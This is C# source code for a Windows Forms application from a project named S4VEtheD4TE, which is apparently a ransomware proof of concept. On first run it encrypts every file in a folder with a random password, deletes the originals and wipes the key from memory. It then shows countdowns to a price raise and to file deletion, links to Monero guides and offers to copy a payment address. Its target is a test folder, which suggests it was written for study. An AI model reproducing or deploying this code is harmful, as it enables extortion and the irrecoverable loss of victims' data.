using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Timers;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

namespace S4VEtheD4TE
{
    public partial class Main : Form
    {
        //  Call this function to remove the key from memory after use for security
        [DllImport("KERNEL32.DLL", EntryPoint = "RtlZeroMemory")]
        public static extern bool ZeroMemory(IntPtr Destination, int Length);

        TimeSpan duration1;
        TimeSpan duration2;
        TimeSpan oneSecond = new TimeSpan(0, 0, 1);
        TimeSpan TimeSinceLastRun;

        public Main()
        {
            InitializeComponent();
            ShowInTaskbar = true;

            timer1.Enabled = true;

            if (Debugger.IsAttached)
            {
                Properties.Settings.Default.Reset();
                Properties.Settings.Default.Save();
            }

            // Check for first use
            if (Properties.Settings.Default.FirstUse == true)
            {
                // Encrypt files
                Encryption encryption = new Encryption();

                // Generates random string
                string password = encryption.RandomString(64);
                //Console.WriteLine(password);

                // For additional security Pin the password of your files
                GCHandle gch = GCHandle.Alloc(password, GCHandleType.Pinned);

                string folderPath = @"C:\encryption_tests";

                foreach (string file in Directory.GetFiles(folderPath, "*.*"))
                {
                    // Encrypt the file
                    encryption.FileEncrypt(file, password);

                    // Deletes original file
                    File.Delete(file);
                }

                // To increase the security of the encryption, delete the given password from the memory !
                ZeroMemory(gch.AddrOfPinnedObject(), password.Length * 2);
                gch.Free();

                // set properties
                duration1 = new TimeSpan(3, 0, 0, 0);
                duration2 = new TimeSpan(7, 0, 0, 0);

                Properties.Settings.Default.Reset();
                Properties.Settings.Default.FirstUse = false;
                Properties.Settings.Default.TimePriceRaise = duration1;
                Properties.Settings.Default.TimeDeleteFiles = duration2;
                Properties.Settings.Default.DateLastRun = DateTime.Now;
                Properties.Settings.Default.Save();
            }
            else
            {
                // update time passed since last run
                TimeSinceLastRun = new TimeSpan(DateTime.Now.Day - Properties.Settings.Default.DateLastRun.Day, DateTime.Now.Hour - Properties.Settings.Default.DateLastRun.Hour, DateTime.Now.Minute - Properties.Settings.Default.DateLastRun.Minute, DateTime.Now.Second - Properties.Settings.Default.DateLastRun.Second);

                //MessageBox.Show("Elapsed time: " + TimeSinceLastRun.ToString());
                Properties.Settings.Default.TimePriceRaise = Properties.Settings.Default.TimePriceRaise.Subtract(TimeSinceLastRun);
                Properties.Settings.Default.TimeDeleteFiles = Properties.Settings.Default.TimeDeleteFiles.Subtract(TimeSinceLastRun);
                Properties.Settings.Default.Save();

                // sets durations
                duration1 = Properties.Settings.Default.TimePriceRaise;
                duration2 = Properties.Settings.Default.TimeDeleteFiles;
            }
        }


        private void time1_Tick(object sender, EventArgs e)
        {
            duration1 = duration1.Subtract(oneSecond);
            duration2 = duration2.Subtract(oneSecond);
            Properties.Settings.Default.TimePriceRaise = duration1;
            Properties.Settings.Default.TimeDeleteFiles = duration2;
            Properties.Settings.Default.DateLastRun = DateTime.Now;
            Properties.Settings.Default.Save();

            Label1.Text = duration1.ToString();
            Label2.Text = duration2.ToString();
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Utils.OpenDefaultBrowser("https://www.getmonero.org/get-started/what-is-monero/");
        }

        private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Utils.OpenDefaultBrowser("https://www.getmonero.org/get-started/faq/");
        }

        private void linkLabel3_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Utils.OpenDefaultBrowser("https://github.com/araujo88/S4VEtheD4TE");
        }

        private void button3_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(textBoxAddress.Text);
        }

        private void Main_FormClosing(object sender, FormClosingEventArgs e)
        {
            Properties.Settings.Default.TimePriceRaise = duration1;
            Properties.Settings.Default.TimeDeleteFiles = duration2;
            Properties.Settings.Default.DateLastRun = DateTime.Now;
            Properties.Settings.Default.Save();

            //e.Cancel = true;
        }
    }
}
